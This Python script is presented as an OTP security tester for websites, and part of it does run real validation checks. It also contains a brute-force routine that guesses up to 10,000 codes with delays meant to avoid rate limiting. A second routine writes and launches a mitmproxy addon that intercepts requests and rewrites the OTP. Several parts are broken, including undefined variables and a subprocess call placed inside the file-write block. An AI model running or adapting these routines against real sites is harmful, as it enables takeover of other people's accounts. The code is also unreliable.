import requests
import time
import random
import string
from datetime import datetime
from mitmproxy import http



class WebsiteOTPTester:
    def __init__(self, verify_url, send_url=None, otp_length=6):
        self.verify_url = verify_url
        self.send_url = send_url
        self.otp_length = otp_length
        self.session = requests.Session()

        self.headers = {
            "User-Agent": "SecurityTestBot/1.0",
            "Content-Type": "application/json",
            "Accept": "application/json"
        }

        self.session.headers.update(self.headers)

    def trigger_otp(self, email_or_phone):
        if not self.send_url:
            return False

        print("Triggering OTP...")
        r = self.session.post(self.send_url, json={"target": email_or_phone})

        print("Status:", r.status_code)
        return r.status_code == 200

    def generate_random_otp(self):
        return ''.join(random.choices(string.digits, k=self.otp_length))

    def test_rate_limit(self, attempts=20):

        print("\nTesting rate limiting...")

        blocked = False

        for i in range(attempts):

            otp = self.generate_random_otp()

            r = self.session.post(
                self.verify_url,
                json={"otp": otp}
            )

            print(f"Attempt {i+1} -> {r.status_code}")

            if r.status_code == 429:
                blocked = True
                print("Rate limit triggered correctly")
                break

            time.sleep(0.5)

        if not blocked:
            print("Warning: No rate limit detected")

    def test_empty_otp(self):

        print("\nTesting empty OTP validation")

        r = self.session.post(
            self.verify_url,
            json={"otp": ""}
        )

        print("Status:", r.status_code)
        print("Response:", r.text[:200])

    def test_long_otp(self):

        print("\nTesting long OTP")

        otp = "1" * 100

        r = self.session.post(
            self.verify_url,
            json={"otp": otp}
        )

        print("Status:", r.status_code)

    def test_reuse(self, valid_otp):

        print("\nTesting OTP reuse")

        r1 = self.session.post(
            self.verify_url,
            json={"otp": valid_otp}
        )

        r2 = self.session.post(
            self.verify_url,
            json={"otp": valid_otp}
        )

        print("First attempt:", r1.status_code)
        print("Second attempt:", r2.status_code)

        if r1.status_code == 200 and r2.status_code == 200:
            print("Warning: OTP reuse allowed")
        else:
            print("OTP reuse not allowed")

    def brute_force_otp(self, max_attempts=10000):
        print("\nBrute-forcing OTP...")
        attempts = 0
        while attempts < max_attempts:
            otp = self.generate_random_otp()
            r = self.session.post(self.verify_url, json={"otp": otp})
            attempts += 1
            if r.status_code == 200:
                print(f"Valid OTP found: {otp}")
                return otp
            print(f"Attempt with OTP {otp} failed")
            time.sleep(0.1)  # To avoid rate limiting
        print("Failed to find a valid OTP within the given attempts.")
        return None

    def mitm_attack(self, target_url):
        print("\nPerforming MitM attack...")
        with open("mitmproxy_script.py", "w") as f:
            f.write("""
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url == target_url:
        flow.request.headers["User-Agent"] = "ModifiedUserAgent/1.0"
        flow.request.headers["Content-Type"] = "application/json"
        flow.request.headers["Accept"] = "application/json"
        flow.request.json()["otp"] = "123456"  # Modify OTP here

def response(flow: http.HTTPFlow) -> None:
    if flow.request.pretty_url == target_url:
        print("Response content:", flow.response.text)

addons = [
    request,
    response
]
""")
            import subprocess
            subprocess.run(["mitmproxy", "-s", "mitmproxy_script.py", "-p", "8080"])

    def run_all_tests(self):

        print("="*50)
        print("WEBSITE OTP SECURITY TEST")
        print("="*50)

        start = datetime.now()

        self.test_empty_otp()
        self.test_long_otp()
        self.test_rate_limit()

        valid_otp = self.brute_force_otp()
        if valid_otp:
            self.test_reuse(valid_otp)

        self.mitm_attack(self.verify_url)

        duration = datetime.now() - start

        print("\nFinished in:", duration)

if __name__ == "__main__":
    tester = WebsiteOTPTester(
        verify_url=url,
        send_url=url2
    )

    tester.run_all_tests()
